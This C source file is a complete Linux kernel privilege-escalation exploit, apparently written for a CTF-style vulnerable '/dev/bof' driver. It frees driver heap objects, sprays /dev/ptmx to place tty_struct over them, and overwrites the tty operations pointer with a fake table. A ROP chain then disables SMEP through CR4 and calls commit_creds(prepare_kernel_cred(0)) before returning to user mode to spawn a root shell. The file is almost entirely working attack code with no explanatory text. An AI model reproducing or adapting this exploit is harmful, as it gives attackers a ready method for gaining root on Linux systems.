#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/fs.h>


#define KERNCALL __attribute__((regparm(3)))

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
    struct file *filp, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct * tty,
    const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
    struct serial_icounter_struct *icount);
    const struct file_operations *proc_fops;
};

struct param
{
    size_t len;
    char* buf;
    unsigned long idx;
};

struct trap_frame{
	void* rip;
	unsigned long cs;
	unsigned long eflags;
	void* rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void *(*prepare_kernel_cred)(void *) KERNCALL=0xffffffff8109bce0;
void *(*commit_creds)(void *) KERNCALL=0xffffffff8109ba30;

unsigned long xchg_eax_esp = 0xffffffff8100008a;
unsigned long pop_rdi_ret = 0xffffffff8108e34d;
unsigned long rdi_to_cr4 = 0xffffffff81004d70; // mov cr4, rdi ;pop rbp ; ret
unsigned long swapgs_pop_ret = 0xffffffff81060274;
unsigned long iretq = 0xffffffff817e6297;
//unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret
//
void get_shell() {
    //system("/bin/sh");
    execl("/bin/sh","sh",NULL);
}
void get_root() {
    asm("addq %0,%%rsp\t\n"
		    ::"r"((unsigned long)0xf00));
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs\t\n"
	"movq %0,%%rsp\t\n"
	"movq %0,%%rbp\t\n"
	"iretq"
	::"r"(&tf));
}
/* status */
void save_stats() {
    asm(
        "movq %%cs, %0\n" // mov rcx, cs
        "movq %%ss, %1\n" // mov rdx, ss
        "pushfq\n"        //
        "popq %2\n"       // pop rax
	"movq %%rsp,%3\n"
        :"=r"(tf.cs), "=r"(tf.ss), "=r"(tf.eflags), "=r"(tf.rsp) : : "memory" // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax
        );
    tf.rip=&get_shell;
    tf.rsp-=0x1000;
}
int main(void)
{
    int fds[10];
    int ptmx_fds[0x100];
    char buf[8];
    int fd;

    unsigned long mmap_base = xchg_eax_esp & 0xffffffff;

    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));

    memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    fake_tty_operations->ioctl = (unsigned long) xchg_eax_esp;
    fake_tty_operations->close = (unsigned long)xchg_eax_esp;

    for (int i = 0; i < 10; ++i)
    {
        fd = open("/dev/bof", O_RDWR);
        if (fd == -1) {
            printf("open bof device failed!\n");
            return -1;
        }
        fds[i] = fd;
    }

   printf("%p\n", fake_tty_operations);

    save_stats();
    printf("mmap_addr: %p\n", mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
    unsigned long rop_chain[] = {
        pop_rdi_ret,
        0x6f0,
        rdi_to_cr4, // cr4 = 0x6f0
        mmap_base,
        (unsigned long)get_root
    };

    memcpy(mmap_base, rop_chain, sizeof(rop_chain));

    struct param p;
    p.len = 0x2e0;
    p.buf = malloc(p.len);

    for (int i = 0; i < 10; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 5, &p);  // malloc
    }

    for (int i = 2; i < 6; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 7, &p); // free
    }

    // 
    for (int i = 0; i < 0x100; ++i)
    {
        ptmx_fds[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if (ptmx_fds[i]==-1)
        {
            printf("open ptmx err\n");
        }
    }
    p.idx = 2;
    p.len = 0x20;
    ioctl(fds[4], 9, &p);

    //
    for (int i = 0; i < 16; ++i)
    {
        printf("%2x ", p.buf[i]);
    }
    printf("\n");

    printf("fake in buf:%p\n",(unsigned long *)&p.buf[24]);
    unsigned long *temp = (unsigned long *)&p.buf[24];
    *temp = (unsigned long)fake_tty_operations;
    for (int i = 2; i < 6; ++i)
    {
        p.idx = i;
	printf("copy fake to kernel(%d)\n",i);
        ioctl(fds[4], 8, &p);
    }
    // getchar();
    for (int i = 0; i < 0x100; ++i)
    {
        ioctl(ptmx_fds[i], 0, 0);
    }
    getchar();
    return 0;
}
